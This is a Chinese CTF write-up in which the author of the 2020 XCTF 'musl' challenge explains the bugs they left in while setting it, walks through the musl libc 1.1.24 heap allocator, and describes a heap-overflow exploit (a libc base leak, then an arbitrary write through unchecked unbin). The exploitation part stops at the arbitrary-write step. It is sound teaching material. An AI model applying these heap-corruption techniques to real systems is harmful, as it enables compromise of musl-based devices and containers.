> 原文链接: https://www.anquanke.com//post/id/202253 


# 从一次 CTF 出题谈 musl libc 堆漏洞利用


                                阅读量   
                                **779621**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01abee00a335366426.png)](https://p4.ssl.qhimg.com/t01abee00a335366426.png)



本文通过一道 CTF 题目展示 musl libc 堆溢出漏洞的利用方法。

## 0. 前言

[2020 XCTF 高校战“疫”](https://www.xctf.org.cn/ctfs/detail/207/)于 3 月 9 日完美落幕，我代表[暨南大学 Xp0int 队](http://blog.leanote.com/xp0int)贡献了一道 PWN 题 musl。

题目的考察点是 musl libc 下堆漏洞的利用，主要是 musl libc 堆管理器的实现和堆溢出漏洞的利用。与传统的 glibc 相比，musl libc 堆管理器十分简单，核心源码只有不到 400 行，所以只要认真阅读源码，即使以前没有了解过 musl libc，也能很容易地发现漏洞的利用方法。

（另外题目的原名是 carbon，不知为何放题的时候名字变成了 musl…）

本文从 musl 题目出发介绍 musl libc 堆漏洞的利用方法，分为三个部分：第一部分说明题目出题时的失误，第二部分是 musl libc 堆管理器实现的概述，最后是题目分析和漏洞利用。

第一次投稿，希望大家多多指教。



## 1. 出题失误

其实这是我第一次为面向公众的 CTF 比赛出题，以前只给[校内新手赛](http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup)出过一些简单的基础题。出题的时候十分小心，特意花了许多时间来巩固题目防止出现失误以及非预期解。结果还是被各路大神找到了非预期解，打爆了题目。。。

经事后检讨，我找到两处出题失误。主要原因都是没有仔细检查好题目，给选手泄漏了多余的信息。接下来就讲一下出现的失误以及修复方法。

```
void init()
`{`
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    LIST = mmap(0, sizeof(struct item) * MAX_LIST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if( LIST == (struct item*)-1 ) `{`
        echo("ERROR: Unable to mmapn");
        a_crash();
    `}`

    alarm(30);
`}`
```

两个失误都位于`init`函数（`sub_400B77`）。上面就是`init`函数的源码，作用是初始化题目环境。

### <a class="reference-link" name="1.1%20%E6%A0%88%E5%9C%B0%E5%9D%80"></a>1.1 栈地址

最大的失误就是没有清除掉 libc 库上的栈地址。

题目的预期解法是使用 FSOP 来劫持程序控制流，但如果能够泄漏栈地址，就能直接向栈上写 ROP 链。比赛结束后我看了一下网上的 WP，大部分都是通过这个方法拿到 shell。

```
pwndbg&gt; leakfind $libc+0x292000 --page_name=stack --max_offset=0x4000 --max_depth=1
0x7ffff7ffb000+0x32f0 —▸ 0x7fffffffe600 [stack]
0x7ffff7ffb000+0x31f8 —▸ 0x7fffffffe390 [stack]
0x7ffff7ffb000+0x2fd8 —▸ 0x7fffffffe4d8 [stack]
0x7ffff7ffb000+0x3000 —▸ 0x7fffffffe765 [stack]
0x7ffff7ffb000+0x3008 —▸ 0x7fffffffe770 [stack]
0x7ffff7ffb000+0x2908 —▸ 0x7fffffffefe6 [stack]
```

修复方法很简单，先用`pwdbg`搜了一下 libc 库 BSS 段上可以泄漏栈地址的地方。

```
#define WRITE_GOT 0x601F98
// clear all stack addresses in libc .BSS section
uint64_t* libc_bss = (uint64_t*)(*((uint64_t*)WRITE_GOT) - 0x5a3b5 + 0x292000);
libc_bss[0x2908/8] = 0;
libc_bss[0x2fd8/8] = 0;
libc_bss[0x3000/8] = 0;
libc_bss[0x3008/8] = 0;
libc_bss[0x31f8/8] = 0;
libc_bss[0x32f0/8] = 0;
libc_bss = 0;
```

然后在`init`函数里逐个清零就行了。

### <a class="reference-link" name="1.2%20mmap"></a>1.2 mmap

另一个失误是搞错了`mmap`函数的用法，导致`LIST`地址的泄漏 。

```
// void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
LIST = mmap(0, sizeof(struct item) * MAX_LIST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
```

出问题的地方是`addr`参数。当`addr`为`0`时，`mmap`在程序的内存空间上找一块空闲的区域，然后将该区域的首地址返回给用户，然而这个地址并不是随机的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cc83937fd7e42d18.png)

在`gdb`下可以发现，`LIST`的内存位置恰好位于 libc 库附近，并且与 libc 基址有着固定的偏移`0x28c000`（libc 基址可泄漏），这导致了`LIST`地址的泄漏。

预期解是使用劫持 bin 链表的方法返回任意指针，实现任意地址写。然而如果已知`LIST`地址，就能通过直接劫持`LIST`来改写上面的指针地址了。

```
// generate a 40 bit random address
uint64_t addr = 0;
int fd = open("/dev/urandom", O_RDONLY);
if( read(fd, &amp;addr, 5) &lt; 0 )
    a_crash();
close(fd);
addr &amp;= ~0xFFF;

LIST = mmap((void*)addr, sizeof(struct item) * MAX_LIST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
if( LIST != (struct item*)addr ) `{`
    echo("ERROR: Unable to mmapn");
    a_crash();
`}`
addr = 0;
```

修复方法是用`/dev/urandom`随机生成一个 40 位地址，然后作为`addr`参数传递给`mmap`函数 。程序不能开启 PIE，因为开启 PIE 会导致预期解中绕过`0xbadbeef`的方法失效。

[![](https://p1.ssl.qhimg.com/t01b2a2c037d5c0ce51.png)](https://p1.ssl.qhimg.com/t01b2a2c037d5c0ce51.png)

修复后，`LIST`是一个随机的地址。

```
void init()
`{`
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // generate a 40 bit random address
    uint64_t addr = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    if( read(fd, &amp;addr, 5) &lt; 0 )
        a_crash();
    close(fd);
    addr &amp;= ~0xFFF;

    LIST = mmap((void*)addr, sizeof(struct item) * MAX_LIST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if( LIST != (struct item*)addr ) `{`
        echo("ERROR: Unable to mmapn");
        a_crash();
    `}`
    addr = 0;

    #define WRITE_GOT 0x601F98
    // clear all stack addresses in libc .BSS section
    uint64_t* libc_bss = (uint64_t*)(*((uint64_t*)WRITE_GOT) - 0x5a3b5 + 0x292000);
    libc_bss[0x2908/8] = 0;
    libc_bss[0x2fd8/8] = 0;
    libc_bss[0x3000/8] = 0;
    libc_bss[0x3008/8] = 0;
    libc_bss[0x31f8/8] = 0;
    libc_bss[0x32f0/8] = 0;
    libc_bss = 0;

    alarm(30);
`}`
```

上面是修复后`init`函数的源码。



## 2. musl libc 堆管理器概述

[musl libc](https://musl.libc.org/) 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 [Alpine Linux](https://zh.wikipedia.org/zh-cn/Alpine_Linux)（做过 Docker 镜像的应该很熟悉）、[OpenWrt](https://zh.wikipedia.org/wiki/OpenWrt)（常用于路由器）和 Gentoo 等。

由于篇幅，我只讲一下 musl libc 堆管理器与 glibc 的不同、部分数据结构、 malloc 与 free 的实现以及静态堆内存。本文使用的 musl libc 版本为 [v1.1.24](https://github.com/bminor/musl/tree/v1.1.24)。

```
In principle, this memory allocator is roughly equivalent to Doug
Lea's dlmalloc with fine-grained locking.

malloc:

Uses a freelist binned by chunk size, with a bitmap to optimize
searching for the smallest non-empty bin which can satisfy an
allocation. If no free chunks are available, it creates a new chunk of
the requested size and attempts to merge it with any existing free
chunk immediately below the newly created chunk.

Whether the chunk was obtained from a bin or newly created, it's
likely to be larger than the requested allocation. malloc always
finishes its work by passing the new chunk to realloc, which will
split it into two chunks and free the tail portion.

```

根据[设计文档](https://github.com/bminor/musl/blob/v1.1.24/src/malloc/DESIGN)，musl libc 堆管理器约等同于`dlmalloc`（glibc 堆管理器`ptmalloc2`的前身），因此某些部分如 chunk、unbin 与 glibc 十分相似。

与 glibc 差异较大的地方是 bin 的设计。在 musl libc 中，bin 是由 64 个结构类似 small bin 的双向循环链表组成，使用 bitmap 记录每个链表是否为非空，维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk）。每个 bin 容纳 chunk 的大小范围不同，最少的只能容纳一种大小的 chunk ，最多的可以容纳多达 1024 种不同大小的 chunk。

musl libc 没有实现如`__malloc_hook`、`__free_hook`之类的 hook 函数，所以不能直接通过堆来劫持程序控制流。另外，在 64 位系统下 chunk 大小是以 32 字节对齐的，这与 glibc 16 字节对齐不同，故 chunk 大小最小为 0x20 字节，然后按 0x40、0x60、0x80… 逐渐递增。

出于性能上的考虑，musl libc 堆管理器省略掉了许多安全性检查，特别是对 chunk 指针的合法性检查，因此 musl libc 的堆漏洞很容易利用。

malloc 和 free 源码位于[`src/malloc/malloc.c`](https://github.com/bminor/musl/blob/v1.1.24/src/malloc/)，部分结构体和宏定义位于[`src/internal/malloc_impl.h`](https://github.com/bminor/musl/blob/v1.1.24/src/internal/malloc_impl.h)。

### <a class="reference-link" name="2.1%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"></a>2.1 数据结构

```
struct chunk `{`
    size_t psize, csize; // 相当于 glibc 的 prev size 和 size
    struct chunk *next, *prev;
`}`;
```

chunk 头部结构跟 glibc 差不多，不过没有`nextsize`指针，chunk 之间不重用`psize`字段。

`psize`和`csize`字段都有标志位（glibc 只有`size`字段有），但只有一种位于最低位的标志位`INUSE`（glibc 最低三位都有标志位）。若设置`INUSE`标志位（最低位为1），表示 chunk 正在被使用；若没有设置`INUSE`标志位（最低位为0），表示 chunk 已经被释放或者通过`mmap`分配的，需要通过`psize`的标志位来进一步判断 chunk 的状态。

```
static struct `{`
    volatile uint64_t binmap;
    struct bin bins[64];
    volatile int free_lock[2];
`}` mal;
```

`mal`结构体类似于 glibc 中的`arena`，记录着堆的状态，有三个成员：64位无符号整数`binmap`、链表头部数组`bins`和锁`free_lock`。`binmap`记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。

```
struct bin `{`
    volatile int lock[2];
    struct chunk *head;
    struct chunk *tail;
`}`;
```

bin 链表头部的结构如上。`head`和`tail`指针分别指向首部和尾部的 chunk，同时首部 chunk 的`prev`指针和尾部 chunk 的`next`指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，`head`和`tail`指针等于 0 或者指向链表头部自身。

<th style="text-align: left;">bin 下标 i</th><th style="text-align: left;">chunk 大小个数</th><th style="text-align: center;">chunk 大小范围</th><th style="text-align: center;">下标 i 与 chunk 大小范围的关系</th>
|------
<td style="text-align: left;">0-31</td><td style="text-align: left;">1</td><td style="text-align: center;">0x20 – 0x400</td><td style="text-align: center;">(i+1) * 0x20</td>
<td style="text-align: left;">32-35</td><td style="text-align: left;">8</td><td style="text-align: center;">0x420 – 0x800</td><td style="text-align: center;">(0x420+(i-32) ** 0x100) ~ (0x500+(i-32) ** 0x100)</td>
<td style="text-align: left;">36-39</td><td style="text-align: left;">16</td><td style="text-align: center;">0x820 – 0x1000</td><td style="text-align: center;">(0x820+(i-36) ** 0x200) ~ (0x1000+(i-36) ** 0x200)</td>
<td style="text-align: left;">40-43</td><td style="text-align: left;">32</td><td style="text-align: center;">0x1020 – 0x2000</td><td style="text-align: center;">(0x1020+(i-40) ** 0x400) ~ (0x1400+(i-40) ** 0x400)</td>
<td style="text-align: left;">44-47</td><td style="text-align: left;">64</td><td style="text-align: center;">0x2020 – 0x4000</td><td style="text-align: center;">(0x2020+(i-44) ** 0x800) ~ (0x2800+(i-44) ** 0x800)</td>
<td style="text-align: left;">48-51</td><td style="text-align: left;">128</td><td style="text-align: center;">0x4020 – 0x8000</td><td style="text-align: center;">(0x4020+(i-48) ** 0x1000) ~ (0x5000+(i-48) ** 0x1000)</td>
<td style="text-align: left;">52-55</td><td style="text-align: left;">256</td><td style="text-align: center;">0x8020 – 0x10000</td><td style="text-align: center;">(0x8020+(i-52) ** 0x2000) ~ (0xa000+(i-52) ** 0x2000)</td>
<td style="text-align: left;">56-59</td><td style="text-align: left;">512</td><td style="text-align: center;">0x10020 – 0x20000</td><td style="text-align: center;">(0x10020+(i-56) ** 0x4000) ~ (0x14000+(i-56) ** 0x4000)</td>
<td style="text-align: left;">60-62</td><td style="text-align: left;">1024</td><td style="text-align: center;">0x20020 – 0x38000</td><td style="text-align: center;">(0x20020+(i-60) ** 0x8000) ~ (0x28000+(i-60) ** 0x8000)</td>
<td style="text-align: left;">63</td><td style="text-align: left;">无限</td><td style="text-align: center;">0x38000 以上</td><td style="text-align: center;">0x38000 ~</td>

上面是每个 bin 的 chunk 大小范围，可以从源码中的[`bin_index_up`函数](https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c#L96)推导出。前 32 个 bin 类似 fastbin 和 small bin，每个 bin 只对应一种大小的 chunk；后 32 个 bin 则类似 large bin，一个 bin 对应多种大小的 chunk。

举个例子，当 bin 下标为 34 时，可知 chunk 大小范围为 0x620 ~ 0x700，即 0x620、0x640、0x660、0x680、0x6b0、0x6d0、0x6e0 和 0x700 一共 8 种大小的 chunk。

### <a class="reference-link" name="2.2%20malloc%20%E5%AE%9E%E7%8E%B0"></a>2.2 malloc 实现

```
// src/malloc/malloc.c L284-L331
void *malloc(size_t n)
`{`
    struct chunk *c;
    int i, j;

    // 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：
    // *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;
    if (adjust_size(&amp;n) &lt; 0) return 0;

    // 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk
    if (n &gt; MMAP_THRESHOLD) `{`
        [...]
        return CHUNK_TO_MEM(c);
    `}`

    // 2. 计算 n 对应的 bin 下标 i
    i = bin_index_up(n);
    for (;;) `{`
        // 3. 查找 binmap
        uint64_t mask = mal.binmap &amp; -(1ULL&lt;&lt;i);
        // 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk
        if (!mask) `{`
            c = expand_heap(n);
            [...]
            break;
        `}`
        // 4. 获取大小最接近 n 的可用 bin 下标 j
        j = first_set(mask);
        lock_bin(j);
        c = mal.bins[j].head; // c 是 bin j 链表首部的 chunk
        // 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c
        if (c != BIN_TO_CHUNK(j)) `{`
            if (!pretrim(c, n, i, j)) unbin(c, j);
            unlock_bin(j);
            break;
        unlock_bin(j);
    `}`

    // 6. 回收 c 中大小超过 n 的部分
    /* Now patch up in case we over-allocated */
    trim(c, n);

    return CHUNK_TO_MEM(c);
`}`
```

malloc 的实现十分简单，主要步骤是首先通过 binmap 选择 bin，然后取出 bin 链表首部的 chunk。取出 chunk 的过程中没有对链表和 chunk 头部进行任何检查。

malloc 详细步骤：
1. 调整 `n`，增加头部长度和对齐 32 位。
1. 如果 `n &gt; MMAP_THRESHOLD`，使用 `mmap` 创建一块大小为 `n` 的内存，返回给用户。
<li>如果 `n &lt;= MMAP_THRESHOLD`，计算 `n` 对应的 bin 下标 `i`，查找 binmap
<ul>
1. 如果所有的可用 bin 均为空，延展堆空间，生成一个新的 chunk
<li>如果存在非空的可用 bin，选择大小最接近 `n` 的 bin `j`，得到 bin 链表首部的 chunk `c`
<ul>
<li>如果符合 `pretrim` 条件，使用 `pretrim` 分割 `c`
</li>
<li>否则使用 `unbin` 从链表中取出 `c`
</li>
</ul>
</li>
1. 最后对 chunk 进行 `trim`，返回给用户。
</ul>
</li>
接下来简单说一下`unbin`、`pretrim`和`trim`。

```
// src/malloc/malloc.c L188-L213
static void unbin(struct chunk *c, int i)
`{`
    // 若 bin 只有一个 chunk，将 bin 设为空 bin
    if (c-&gt;prev == c-&gt;next)
        a_and_64(&amp;mal.binmap, ~(1ULL&lt;&lt;i));
    // 取出链表中的 chunk
    c-&gt;prev-&gt;next = c-&gt;next;
    c-&gt;next-&gt;prev = c-&gt;prev;
    // 设置 INUSE 标志位
    c-&gt;csize |= C_INUSE;
    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;
`}`
```

`unbin`相当于 glibc 中的 `unlink`，作用是从 bin 双向链表中取出 chunk 。取出的过程中`unbin`没有检查 chunk 指针是否合法。

```
// src/malloc/malloc.c L233-L264
/* pretrim - trims a chunk _prior_ to removing it from its bin.
 * Must be called with i as the ideal bin for size n, j the bin
 * for the _free_ chunk self, and bin j locked. */
static int pretrim(struct chunk *self, size_t n, int i, int j)
`{`
    size_t n1;
    struct chunk *next, *split;

    // 条件 1: bin j 下标大于 40
    /* We cannot pretrim if it would require re-binning. */
    if (j &lt; 40) return 0;
    // 条件 2: bin j 与 i 相隔 3 个 bin 或以上，
    // 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD
    if (j &lt; i+3) `{`
        if (j != 63) return 0;
        n1 = CHUNK_SIZE(self);
        if (n1-n &lt;= MMAP_THRESHOLD) return 0;
    `}` else `{`
        n1 = CHUNK_SIZE(self);
    `}`
    // 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin
    if (bin_index(n1-n) != j) return 0;

    // 切割出一块大小为 n 的 chunk
    next = NEXT_CHUNK(self);
    split = (void *)((char *)self + n);

    split-&gt;prev = self-&gt;prev;
    split-&gt;next = self-&gt;next;
    split-&gt;prev-&gt;next = split;
    split-&gt;next-&gt;prev = split;
    split-&gt;psize = n | C_INUSE;
    split-&gt;csize = n1-n;
    next-&gt;psize = n1-n;
    self-&gt;csize = n | C_INUSE;
    return 1;
`}`
```

`pretrim`的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，`pretrim`从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。

```
// src/malloc/malloc.c L266-L282
static void trim(struct chunk *self, size_t n)
`{`
    size_t n1 = CHUNK_SIZE(self);
    struct chunk *next, *split;

    // 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节
    if (n &gt;= n1 - DONTCARE) return;

    // 将 self 的大小切割为 n，剩余部分成为新的 chunk split
    next = NEXT_CHUNK(self);
    split = (void *)((char *)self + n);

    split-&gt;psize = n | C_INUSE;
    split-&gt;csize = n1-n | C_INUSE;
    next-&gt;psize = n1-n | C_INUSE;
    self-&gt;csize = n | C_INUSE;

    // 将 split 释放到 bin
    __bin_chunk(split);
`}`
```

malloc 的最后一步是`trim`，主要作用是回收 chunk 超过需求大小的部分。`trim`将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。

### <a class="reference-link" name="2.3%20free%20%E5%AE%9E%E7%8E%B0"></a>2.3 free 实现

```
// src/malloc/malloc.c L519-L529
void free(void *p)
`{`
    if (!p) return;

    struct chunk *self = MEM_TO_CHUNK(p);

    // 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free
    // #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))
    if (IS_MMAPPED(self))
        unmap_chunk(self);
    else
        __bin_chunk(self);
`}`

// src/malloc/malloc.c L509-L517
static void unmap_chunk(struct chunk *self)
`{`
    size_t extra = self-&gt;psize;
    char *base = (char *)self - extra;
    size_t len = CHUNK_SIZE(self) + extra;
    // 若 prev size 设置了 INUSE 标志位，视为 double free，crash
    /* Crash on double free */
    if (extra &amp; 1) a_crash();
    __munmap(base, len);
`}`
```

free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的`csize`字段没有设置`INUSE`标志位，进入`unmap_chunk`函数检查`psize`字段。如果`psize`字段设置了`INUSE`标志位，视为 double free，crash；否则视为 mmap chunk，调用`__munmap`函数释放。

```
// src/malloc/malloc.c L440-L507
void __bin_chunk(struct chunk *self)
`{`
    struct chunk *next = NEXT_CHUNK(self);
    size_t final_size, new_size, size;
    int reclaim=0;
    int i;

    // new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小
    final_size = new_size = CHUNK_SIZE(self);

    // 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash
    /* Crash on corrupted footer (likely from buffer overflow) */
    if (next-&gt;psize != self-&gt;csize) a_crash();

    // 1. 检查 self 前后是否有空闲 chunk
    for (;;) `{`
        if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) `{`
            // 去除 INUSE 标志位
            self-&gt;csize = final_size | C_INUSE;
            next-&gt;psize = final_size | C_INUSE;
            // 计算 final_size 对应的 bin 下标 i
            i = bin_index(final_size);
            lock_bin(i);
            lock(mal.free_lock);
            if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)
                break;  // 退出循环
            unlock(mal.free_lock);
            unlock_bin(i);
        `}`

        // 向前合并空闲 chunk
        if (alloc_rev(self)) `{`  // 从 bin 链表取出待合并的空闲 chunk
            self = PREV_CHUNK(self);
            size = CHUNK_SIZE(self);
            final_size += size;
            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)
                reclaim = 1;
        `}`

        // 向后合并空闲 chunk
        if (alloc_fwd(next)) `{`  // 从 bin 链表取出待合并的空闲 chunk
            size = CHUNK_SIZE(next);
            final_size += size;
            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)
                reclaim = 1;
            next = NEXT_CHUNK(next);
        `}`
    `}`

    //2. 在 binmap 中，将 bin i 设为非空 bin
    if (!(mal.binmap &amp; 1ULL&lt;&lt;i))
        a_or_64(&amp;mal.binmap, 1ULL&lt;&lt;i);

    self-&gt;csize = final_size;
    next-&gt;psize = final_size;
    unlock(mal.free_lock);

    // 3. 将 self 加入到 bin i 链表的尾部
    self-&gt;next = BIN_TO_CHUNK(i);
    self-&gt;prev = mal.bins[i].tail;
    self-&gt;next-&gt;prev = self;
    self-&gt;prev-&gt;next = self;

    /* Replace middle of large chunks with fresh zero pages */
    if (reclaim) `{`
        [...]
    `}`

    unlock_bin(i);
`}`
```

`__bin_chunk`函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。

### <a class="reference-link" name="2.4%20%E9%9D%99%E6%80%81%E5%A0%86%E5%86%85%E5%AD%98"></a>2.4 静态堆内存

在 glibc 中，堆一般位于内存中的动态内存区域。而 musl libc 堆管理器为了减少内存开销，将程序和 libc 库（静态内存）的空闲内存划分为堆内存，并优先使用静态堆内存来分配 chunk。只有当静态堆内存耗尽或者不能满足需求时，musl libc 才会去申请动态内存。

接下来介绍一下 musl libc 如何实现这个特性。

```
void __dls3(size_t *sp)
`{`
    [...]
    // ldso/dynlink.c L1839-L1840
    /* Donate unused parts of app and library mapping to malloc */
    reclaim_gaps(&amp;app);
    reclaim_gaps(&amp;ldso);
    [...]
`}`
```

在初始化过程中，musl libc 调用`reclaim_gaps`函数查找并释放程序和 libc 库的空闲内存。

```
// ldso/dynlink.c L526-L552
/* A huge hack: to make up for the wastefulness of shared libraries
 * needing at least a page of dirty memory even if they have no global
 * data, we reclaim the gaps at the beginning and end of writable maps
 * and "donate" them to the heap. */

static void reclaim(struct dso *dso, size_t start, size_t end)
`{`
    // 避开 RELRO 段
    if (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;
    if (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;
    if (start &gt;= end) return;
    char *base = laddr_pg(dso, start);
    // 使用 __malloc_donate 函数将内存释放到 bin 中
    __malloc_donate(base, base+(end-start));
`}`

static void reclaim_gaps(struct dso *dso)
`{`
    Phdr *ph = dso-&gt;phdr;
    size_t phcnt = dso-&gt;phnum;

    // 遍历每一个段
    for (; phcnt--; ph=(void *)((char *)ph+dso-&gt;phentsize)) `{`
        // 条件 1：段不属于可加载段（PT_LOAD）
        if (ph-&gt;p_type!=PT_LOAD) continue;
        // 条件 2：段可读可写
        if ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) continue;
        // 在段所属的内存页中，将段前后的空闲内存传递给 reclaim 函数
        reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);
        reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,
            ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE-1 &amp; -PAGE_SIZE);
    `}`
`}`
```

`reclaim_gaps`函数遍历每一个内存段，若找到符合条件的段，计算段所属的内存页，将`页首地址 ~ 段首地址`和`段末地址 ~ 页末地址`这两个空闲内存块传递给`reclaim`函数，最后通过`__malloc_donate`函数释放到 bin 中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015eb6b81578aa8d0c.png)

musl libc 完成初始化后，通过`gdb`可以发现 bin 中有两个 chunk，它们的内存位置恰好位于 libc 库和程序。malloc 可以使用`trim`或者`pretrim`切割这两个 chunk，生成多个 chunk 分配给用户。

这个特性有利于漏洞利用过程中的信息泄漏：如果已知某个 chunk 地址，就等同于泄漏了 libc 基址或程序基址；相反，如果能够泄漏 libc 基址或程序基址，就能计算任意 chunk 的地址。



## 3. 题目分析

题目源码：[https://github.com/xf1les/XCTF_2020_PWN_musl](https://github.com/xf1les/XCTF_2020_PWN_musl)

运行 source 目录下面的 build.sh，可以编译带调试信息的 libc 库和 carbon 程序。

```
root@4124cf40a89b:/pwn/Debug# ./libc.so
musl libc (x86_64)
Version 1.1.24
Dynamic Program Loader
Usage: ./libc.so [options] [--] pathname [args]
root@4124cf40a89b:/pwn/Debug# checksec carbon
[*] '/pwn/Debug/carbon'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序开启除 PIE 以外的所有防护机制，musl libc 版本为 1.1.24。

```
1) Assign sleeves
2) Destory sleeves
3) Transform sleeves
4) Examine sleeves
5) Real death
&gt;
```

典型的菜单题，可以添加、删除、编辑和显示堆块。以下地方需要注意一下：
- add 允许堆溢出一次，溢出长度 0x50 字节。
- 只有一处地方调用`exit`函数：当 malloc 返回的指针地址为`0xbadbeef`时。
- view 只能用一次。


## 4. 漏洞利用

漏洞利用主要分为三步：第一步泄漏 libc 基址；第二步通过堆溢出改写链表首部 chunk 的指针字段，利用 unbin 进行任意地址写；第三步布置 FSOP 和修改堆内部变量，通过`exit`函数触发 FSOP，拿到 shell。

### <a class="reference-link" name="4.1%20%E6%B3%84%E6%BC%8F%20libc%20%E5%9F%BA%E5%9D%80"></a>4.1 泄漏 libc 基址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016043560e3bcc63ae.png)

申请大小小于 0x400 字节的 chunk，chunk 前 8 字节就是 unbin 时残留的 bin 链表头部地址。用上只能用一次的 view，即可泄漏 libc 基址。

```
add(0x1, 'A') #0
libc_base = u64(view(0).ljust(8, 'x00')) - 0x292e41 # bin[0]
```

当 chunk 大小为 0x20 字节时，地址指向`mal.bins[0]`的链表头部`mal+832`，相对于基址的偏移是 0x292e00。

### <a class="reference-link" name="4.2%20%E5%88%A9%E7%94%A8%20unbin%20%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"></a>4.2 利用 unbin 实现任意地址写

unbin 没有检查`prev`和`next`指针是否合法，通过堆溢出我们可以改写这两个指针，利用 unbin 向任意地址写指针地址，即`*(uint64_t*)(prev + 2) = next`和`*(uint64_t*)(next + 3) = prev`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a818a0515d80ac16.png)

如图，`mal.bins[38]`是一个非空 bin。我们可以在待控制的内存块附近构建一个 fake chunk，利用 unbin 将 fake chunk 地址写到`mal.bins[38]-&gt;head`指针上，通过劫持 bin 链表使`malloc`返回 fake chunk，实现任意地址写。

